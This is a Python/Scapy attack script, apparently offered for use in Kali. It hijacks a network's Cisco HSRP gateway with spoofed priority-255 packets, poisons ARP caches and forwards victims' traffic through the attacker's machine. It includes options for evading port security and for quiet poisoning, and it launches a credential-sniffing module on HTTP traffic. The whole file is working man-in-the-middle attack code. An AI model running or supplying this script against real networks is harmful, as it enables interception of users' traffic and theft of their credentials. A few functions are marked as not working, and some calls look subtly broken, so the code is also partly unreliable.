#script tested working in kali

from scapy.all import *
import threading
import netifaces as ni
import ipaddress
import time
import random
import httpgrabber

# [OPTIONS]
# change as necessary
interface = "eth0"

# Default False. option to poison router if sniffing of response is required, makes attack more noisy, mutually exclusive with translateip
# can be toggled at runtime by typing "poison"
poisonrouter = False

# Default True. only poison for packets of interest, when poisonrouter set to True
# see arp_poison() for rules
silentmode = True

# Default True. option to force use of own mac address only when sending hsrp and arp packets
attackportsecurity = True

# Default False. perform nat translation for all received packets before forwarding to router. poisonrouter should be set to False when translateip set to True
translateip = False

# Default True. forwards received packets to their intended destination.
forwardpackets = True

# print more info to stdout at runtime. Toggleable at runtime by typing "debug"
debug = False

# exit when detected failed attack
terminateonfail = False

# for testing only, to set to false when running attack
usepcapfile = False
spoison = False
nosubinter = False

# utility variables for creation of rules
myip = ni.ifaddresses(interface)[ni.AF_INET][0]["addr"]
mymac = ni.ifaddresses(interface)[ni.AF_LINK][0]["addr"]
mynetmask = ni.ifaddresses(interface)[ni.AF_INET][0]['netmask']
myprefix = ipaddress.IPv4Network(f"0.0.0.0/{mynetmask}").prefixlen
mynetwork = ipaddress.ip_interface(f"{myip}/{myprefix}").network

# globals
hsrpfound = False
attackstarted = False
version: int
pkcopy: Packet
timekeeper = {}
commandlist = []

# hsrpv2 variables
# hello time (secs)
v2hellotime = 3

# for suppressing output
suppress = False
# not in use
translations = {}
portcounter = 0

def find_hsrp():
    '''Sniff for HSRP packets
    
    If attack not started yet, keeps sniffing for packets until active HSRP is found, then returns True
    
    If attack has started, running this function again will sniff perpetually and set hsrpfound to True if active HSRP is found'''
    global hsrpfound
    hsrpfound = False
    print("Listening for active HSRP packets on UDP port 1985...")
    if not usepcapfile:
        sniff(prn=check_hsrp, filter="udp and udp dst port 1985", stop_filter=hsrp_found)
    else:
        sniff(prn=check_hsrp, filter="udp and udp dst port 1985", stop_filter=hsrp_found, offline="hsrp v1.pcap")
    if hsrpfound:
        return True
    return False

def hsrp_found(packet):
    '''Stop condition for sniff()'''
    # sniff forever if attack already started
    if attackstarted:
        return False
    return hsrpfound == True

#called by sniff() to check for valid hsrp
def check_hsrp(packet):
    '''Called by sniff() to check for valid and active HSRP
    
    Sets hsrpfound to true if valid and active HSRP is found'''
    global version
    global hsrpfound
    global pkcopy
    if packet[HSRP].version == 0:
        if not check_v1_fields(packet):
            return
        # if attack has already started, HSRP routers are still active (failed attack)
        if attackstarted:
            srcip = packet[IP].src
            if srcip != myip:
                hsrpfound = True
            return
        else:
            print("[INFO] Active HSRP found, version 1")
        if debug:
            print("[HSRP] Active router group: ", packet[HSRP].group)
            print("[HSRP] Active router priority: ", packet[HSRP].priority)
            print("[HSRP] Active router IP: ", packet[IP].src)
            print("[HSRP] Virtual gateway IP: ", packet[HSRP].virtualIP)
            print("[HSRP] HSRP Hello time: ", packet[HSRP].hellotime)
            packet.show()
        version = 1
        hsrpfound = True
        pkcopy = packet
    else:
        ethersrc = packet[Ether].src
        gp = hex(packet['HSRP'].reserved)[2:].zfill(3)
        gp = gp[:1] + ':' + gp[1:]
        if packet['Ethernet'].src == "00:00:0c:9f:f" + gp:
            if attackstarted:
                srcip = packet[IP].src
                if srcip != myip:
                    hsrpfound = True
                return
            print("[INFO] Active HSRP found, version 2")
            if debug:
                # show HSRPv2 packet structure for debug purposes
                packet.show()
            version = 2
            hsrpfound = True
            pkcopy = packet

# make sure hsrp packet is valid
def check_v1_fields(packet):
    '''Checks fields in HSRP packet
    
    Returns True if valid and active HSRP
    
    Returns False if not HSRP or not active HSRP'''
    try:
        # check correct version
        assert packet[HSRP].version == 0
        # check for HSRP Hello
        assert packet[HSRP].opcode == 0
        # check for active HSRP router
        assert packet[HSRP].state == 16
        # check correct destination ip
        assert packet[IP].dst == "224.0.0.2"
        # check correct mac
        assert packet[Ether].src[:15] == "00:00:0c:07:ac:"
    except:
        # not valid if any assert fails
        return False
    return True

def send_hsrp(packet):
    '''Mimics cisco HSRP behaviour and sends HSRP and ARP packets to take over existing HSRP router.
    
    After initial HSRP/ARP pattern, sends HSRP packets forever until execution of program ends'''
    global attackstarted
    attackstarted = True
    if attackportsecurity:
        ethersrc = mymac
    # use hsrp virtual mac if not attacking port security
    else:
        ethersrc = packet[Ether].src
    # copy fields of original HSRP packet
    etherdst = packet[Ether].dst
    ipdst = packet[IP].dst
    ipttl = packet[IP].ttl
    sport = packet[UDP].sport
    dport = packet[UDP].dport
    if version == 1:
        hellotime = packet[HSRP].hellotime
        holdtime = packet[HSRP].holdtime
        group = packet[HSRP].group
        auth = packet[HSRP].auth
        virtualIP = packet[HSRP].virtualIP
        # initial opcode is COUP
        op=1
        # Start sending spoofed HSRPv1 and ARP packet
        print("Hijacking HSRPv1...")
        pkt = Ether(dst=etherdst, src=ethersrc)/IP(dst=ipdst, ttl=ipttl)/UDP(sport=sport, dport=dport)/HSRP(opcode=op, state=16, hellotime=hellotime, holdtime=holdtime, priority=255, group=group, auth=auth, virtualIP=virtualIP)
        # Mimic sending pattern of cisco HSRP routers with 2 ARP broadcast
        sendp(pkt, verbose=False)
        send_initial_arp(0, False)
        send_initial_arp(1, True)
        pkt[HSRP].opcode = 0

        sendp(pkt, verbose=False)
        send_initial_arp(0, True)
        arp_thread = threading.Thread(target=start_arp_responder, args=(pkcopy), daemon=True)
        arp_thread.start()
        selective_poison = threading.Thread(target=start_selective_poisoning, args=(pkcopy), daemon=True)
        selective_poison.start()
        sendp(pkt, inter=packet[HSRP].hellotime, loop=1, verbose=False)
    else:
        eth = Ether(src=ethersrc, dst=etherdst)
        ip = IP(src=myip, dst=ipdst, len=80, ttl=ipttl)
        udp = UDP(sport=sport, dport=dport, len=60)
        #HSRPv2 variables
        hellotime = 3000
        holdtime = 10000
        op = 0
        st = 6
        ver = 2
        priority = 255
        id = packet['HSRP'].auth
        grp = packet['HSRP'].reserved
        virtIP = packet['HSRP MD5 Authentication'].sourceip
        auth = packet['HSRP MD5 Authentication'].authdigest
        payloadHSRP = ver.to_bytes(1,'big') + op.to_bytes(1,'big') + st.to_bytes(1, 'big') + b'\x04' + grp.to_bytes(2,'big') + id + priority.to_bytes(2,'big') + hellotime.to_bytes(4,'big') + holdtime.to_bytes(4,'big') + bytes(map(int, virtIP.split('.'))) + bytes(4) + auth + bytes(2)
        hsrp = IPv6ExtHdrSegmentRoutingTLV(type=1, len=40, value=payloadHSRP)
        # Start sending spoofed HSRP and ARP packet
        pkt = eth/ip/udp/hsrp
        print("Hijacking HSRPv2...")
        sendp(pkt, verbose=False)
        send_initial_arp(0, False)
        send_initial_arp(1, True)
        sendp(pkt, verbose=False)
        send_initial_arp(0, True)
        arp_thread = threading.Thread(target=start_arp_responder, args=(pkcopy), daemon=True)
        arp_thread.start()
        selective_poison = threading.Thread(target=start_selective_poisoning, args=(pkcopy), daemon=True)
        selective_poison.start()
        sendp(pkt, iface=interface, inter=3, loop=1, verbose=False)

# Send arp with HSRP virtual ip to redirect local traffic to attacker
def send_initial_arp(type, pause=True):
    '''Send arp with HSRP virtual ip to redirect local traffic to attacker. 
    
    Can choose to send as broadcast or send to stp uplinkfast based on arguments
    
    Arguments: 
    
    type: type of ARP packet to send, 0: broadcast, 1: STP uplinkfast
    
    pause: whether to pause for duration of HSRP hellotime'''
    if attackportsecurity:
        ethersrc = mymac
    else:
        # use HSRP mac if not attacking port security
        ethersrc = pkcopy[Ether].src
    if version == 1:
        virtualIP = pkcopy[HSRP].virtualIP
        hellotime = pkcopy[HSRP].hellotime
    elif version == 2:
        virtualIP = pkcopy['HSRP MD5 Authentication'].sourceip
        hellotime = v2hellotime
    if type == 0:
        etherdst = "ff:ff:ff:ff:ff:ff"
    elif type == 1:
        etherdst = "01:00:0c:cd:cd:cd"
    if pause:
        interval = hellotime
    else:
        interval = 0
    # opcode for reply
    opcode = 2
    pkt = Ether(src=ethersrc, dst=etherdst)/ARP(op=opcode, hwsrc=ethersrc, psrc=virtualIP, hwdst=etherdst, pdst=virtualIP)
    sendp(pkt, inter=interval, verbose=False)

def start_arp_responder(packet):
    '''sniff and respond to arp request for HSRP virtual ip address from network'''
    if version == 1:
        virtualIP = packet[HSRP].virtualIP
    elif version == 2:
        virtualIP = pkcopy['HSRP MD5 Authentication'].sourceip
    if debug:
        print(f"[DEBUG] Responding to ARP requests for {virtualIP}")
    filterstring = f"arp and (arp[6:2] = 1) and dst host {virtualIP} and src host not {virtualIP} and ether src host not {mymac}"
    sniff(prn=arp_respond, filter=filterstring)

def arp_respond(packet):
    '''Called by sniff() in start_arp_responder to send unicast arp response to any request for HSRP virtual ip address, if matching rules in start_arp_responder'''
    start = time.time() * 1000
    if version == 1:
        virtualIP = pkcopy[HSRP].virtualIP
    elif version == 2:
        virtualIP = pkcopy['HSRP MD5 Authentication'].sourceip
    if attackportsecurity:
        ethersrc = mymac
    else:
        ethersrc = pkcopy[Ether].src
    victimEther = packet[Ether].src
    victimIP = packet[ARP].psrc
    pkttosend = Ether(src=ethersrc, dst=victimEther)/ARP(op=2, hwsrc=ethersrc, psrc=virtualIP, hwdst=victimEther, pdst=victimIP)
    # delay 200ms to beat ARP response from HSRP router when HSRP attack fails but arp not blocked
    while time.time() * 1000 - start < 200:
        pass
    sendp(pkttosend, verbose=False)
    if not suppress:
        return f"Responded to ARP request from {victimIP}"

def start_selective_poisoning(packet):
    '''Start poisoning router's arp cache, but only when hosts are sending packets
    
    Packets will be broadcast to look like a request for the virtual gateway ip'''
    if debug and poisonrouter:
        print("[DEBUG] Poisoning router to get return packets")
        print(f"[DEBUG] Silent mode: {silentmode}")
    routerIP = packet[IP].src
    filterstring = f"ip and (tcp or udp) and src host not ({routerIP} or 0.0.0.0) and ether src host not {mymac} and src net {mynetwork} and not ip multicast"
    sniff(prn=arp_poison, filter=filterstring)

def arp_poison(packet):
    '''Called by sniff() in start_selective_poisoning to poison arp cache of HSRP router when attacker receives traffic from victim
    
    Packets will be broadcast to look like a request for the virtual gateway ip'''
    if not poisonrouter:
        return
    elif silentmode:
        try:
            if packet[TCP].dport != 80:
                return
        except:
            return
    if version == 1:
        virtualIP = pkcopy[HSRP].virtualIP
    elif version == 2:
        virtualIP = pkcopy['HSRP MD5 Authentication'].sourceip
    try:
        victimIP = packet[IP].src
        # keep track of time since last arp packet sent, skip if arp has been sent in the past x seconds, chosen at random between 10 and 20 seconds
        if victimIP not in timekeeper:
            timekeeper[victimIP] = time.time()
        elif time.time() - timekeeper[victimIP] < random.randint(10, 20):
            return
        dstIP = packet[IP].dst
        # set ARP op code for ARP request
        op = 1
        ethersrc = mymac
        etherdst = "ff:ff:ff:ff:ff:ff"
        # ARP poisoning "I am victim, who is gateway"
        arppkt = Ether(src=ethersrc, dst=etherdst)/ARP(op=op, hwsrc=ethersrc, psrc=victimIP, pdst=virtualIP)
        sendp(arppkt, verbose=False)
        timekeeper[victimIP] = time.time()
        if debug and not suppress:
            return f"[DEBUG] Spoofing ARP from {victimIP}, trigger: packet sent to {dstIP}"
    except:
        if debug and not suppress:
            print("[DEBUG] Not IP packet")
            packet.show()
    return

# [not working, not in use] sniff for packets to manually forward
def start_forward_sniffer():
    if version == 1:
        virtualIP = pkcopy[HSRP].virtualIP
    else:
        virtualIP = "192.168.1.254"
    filterstring = f"ip and (tcp or udp) and dst host not ({virtualIP} or 0.0.0.0) and ether src host not {mymac} and not ip multicast"
    sniff(prn=manual_forwarding, filter=filterstring)

# [not working, not in use] manually forward packets and replace source ip of packets exiting network with own ip, dest ip of packets entering network with remembered ip
def manual_forwarding(packet):
    global portcounter
    dst_address_string = packet[IP].dst
    proto:str
    
    # lookup dst port in dictionary to find original src ip and port. If not found, no need to translate (victim host did not initiate connection)
    if dst_address_string == myip:
        try:
            dport = packet[TCP].dport
            proto = "TCP"
        except:
            dport = packet[UDP].dport
            proto = "UDP"
        finally:
            if dport in translations:
                dstip, dstport = translations[dport]
                packet[Ether].src = mymac
                del packet[Ether].dst
                packet[IP].dst = dstip
                del packet[IP].chksum
                packet[proto].dport = dstport
                del packet[proto].chksum
                sendp(packet, verbose=False, realtime=True)
                del translations[dport]
    # store src ip and port in dictionary along with new src port to use for future translation back to original ip
    else:
        try:
            sport = packet[TCP].sport
            dport = packet[TCP].dport
            proto = "TCP"
        except:
            sport = packet[UDP].sport
            dport = packet[UDP].dport
            proto = "UDP"
        finally:
            srcip = packet[IP].src
            newport = portcounter%60001 + 5535
            translations[newport] = srcip, sport
            if proto == "TCP" and srcip in translations:
                storedport = translations[srcip]
                #if dport == storedport and :
                #    return
            portcounter += 1
            packet[Ether].src = mymac
            del packet[Ether].dst
            packet[IP].src = myip
            del packet[IP].chksum
            packet[proto].sport = newport
            del packet[proto].chksum
            sendp(packet, verbose=False, realtime=True)

def simple_poison(interval):
    '''Simple ARP poisoning to broadcast attacker as gateway using HSRP virtual IP'''
    print("Using simple poison")
    last = time.time()
    while True:
        if time.time() - last > 10:
            gateway = pkcopy[HSRP].virtualIP
            etherdst = "ff:ff:ff:ff:ff:ff"
            sendp(Ether(src=mymac, dst=etherdst)/ARP(op=2, hwsrc=mymac, psrc=gateway, hwdst=etherdst, pdst=gateway), verbose=False)
            last += interval

# Start subinterface on attacker pc with same IP as HSRP gateway virtualip (to let linux handle forwarding of packets)
def start_subinterface():
    if version == 1:
        virtualIP = pkcopy[HSRP].virtualIP
    elif version == 2:
        virtualIP = pkcopy['HSRP MD5 Authentication'].sourceip
    if debug:
        print(f"Starting sub interface with IP: {virtualIP} on {interface}")
    subprocess.run(f"ifconfig {interface}:1 {virtualIP} netmask {mynetmask} up".split())

# Enable routing of received packets on attacker pc (let linux handle packet forwarding)
def enable_forwarding():
    if debug:
        print("Enabling packet forwarding on linux:")
    subprocess.run("sysctl -w net.ipv4.ip_forward=1".split())

# Change default gateway of attacker pc to active HSRP router
def change_default_gw():
    routerIP = pkcopy[IP].src
    if debug:
        print(f"Changing default gateway to: {routerIP}")
    subprocess.run(f"route add default gw {routerIP} {interface}".split())

# Let linux perform nat translation    
def enable_translation():
    if debug:
        print("[DEBUG] Translating forwarded packets")
    subprocess.run(f"iptables -t nat -A POSTROUTING -o {interface} -j MASQUERADE".split())

def delayed_failure_check():
    '''Check status of attack 4x hellotime after start of attack, check every hellotime + 1 seconds
    
    Prints information to stdout'''
    start = time.time()
    global hsrpfound
    if version == 1:
        hellotime = pkcopy[HSRP].hellotime
    elif version == 2:
        hellotime = v2hellotime
    # will change hsrpfound to true if active hsrp found
    check_fail = threading.Thread(target=find_hsrp, daemon=True)
    check_fail.start()
    succeeded = 0
    while True:
        if time.time() - start > 4*hellotime:
            if hsrpfound:
                print("[WARN] Attack failed")
                succeeded = 0
                if terminateonfail:
                    cleanup()
                    os._exit(0)
            elif not suppress and debug:
                print("[DEBUG] You are active router")
                succeeded = 1
            elif not suppress and succeeded == 0:
                    print("[INFO] You are active router")
                    succeeded = 1
            start += hellotime + 1
            hsrpfound = False

# 
def user_input_handler():
    '''Performs action based on user input'''
    print("\n[INFO] Commands available:\n\
        debug: Show more information\n\
        suppress: Suppress console output\n\
        poison: toggle ARP poisoning\n\
        silent: toggle silent mode\n\
        translate <ip>: perform nat translations for ip address")
    while True:
        usrinput: str
        usrinput = input().split()
        match usrinput[0]:
            case "stop":
                cleanup()
                os._exit(0)
            case "debug":
                global debug
                debug = debug != True
                print(f"[INFO] Debug set to {debug}")    
            case "translate":
                # quick and simple validation
                if len(usrinput[1].strip()) < 7:
                    print("[INFO] Please check input")
                command = f"iptables -t nat -A POSTROUTING -o eth0 -s {usrinput[1]} -j MASQUERADE"
                subprocess.run(command.split())
                print(f"[INFO] Now translating packets from source: {usrinput[1]}")
                command = f"iptables -t nat -D POSTROUTING -o eth0 -s {usrinput[1]} -j MASQUERADE"
                commandlist.append(command)
            case "suppress":
                global suppress
                suppress = suppress != True
                print(f"[INFO] suppress console output set to {suppress}")
            case "poison":
                global poisonrouter
                poisonrouter = poisonrouter != True
                print(f"[INFO] poisonrouter set to {poisonrouter}")
            case "silent":
                global silentmode
                # toggle silentmode
                silentmode = silentmode != True
                print(f"[INFO] Silent mode: {silentmode}")

def setup():
    '''Runs commands to configure linux for attack'''
    if forwardpackets:
        enable_forwarding()
    if translateip:
        enable_translation()
    if not nosubinter:
        start_subinterface()
    change_default_gw()
    

def cleanup():
    routerip = pkcopy[IP].src
    # remove default gateway
    subprocess.run(f"route delete default gw {routerip} {interface}".split())
    # remove subinterface
    if not nosubinter:
        subprocess.run(f"ifconfig {interface}:1 down".split())
    # disable forwarding
    subprocess.run(f"sysctl -w net.ipv4.ip_forward=0".split())
    # disable translation
    if translateip:
        subprocess.run(f"iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE".split())
    # erase rules added at runtime
    for entry in commandlist:
        subprocess.run(entry.split())
        print(entry)
    print("Completed clean up")

if __name__ == "__main__":
    try:
        print(f"Options used:\n\
            Interface: {interface}\n\
            Silent Mode: {silentmode}\n\
            Poison Router: {poisonrouter}\n\
            Attack Port Security: {attackportsecurity}\n\
            Translate IP: {translateip}\n\
            Debug: {debug}\n\
            Use pcap file: {usepcapfile}\n\
            Terminate on fail: {terminateonfail}")
        if find_hsrp():
            setup()
            print(f"Attacking on this interface: {interface} {myip} {mymac}")
            '''if translateip:
                forwarding = threading.Thread(target=start_forward_sniffer, daemon=True)
                forwarding.start()'''
            if spoison:
                poison = threading.Thread(target=simple_poison, args=(5,), daemon=True)
                poison.start()
            fail_check = threading.Thread(target=delayed_failure_check, daemon=True)
            fail_check.start()
            attack_hsrp = threading.Thread(target=send_hsrp, args=(pkcopy), daemon=True)
            attack_hsrp.start()
            threading.Thread(target=httpgrabber.sniffcreds, daemon=True).start()
            user_input_handler()
    except KeyboardInterrupt:
        print("\nUser interrupt, exiting...\n")
        cleanup()
        os._exit(0)
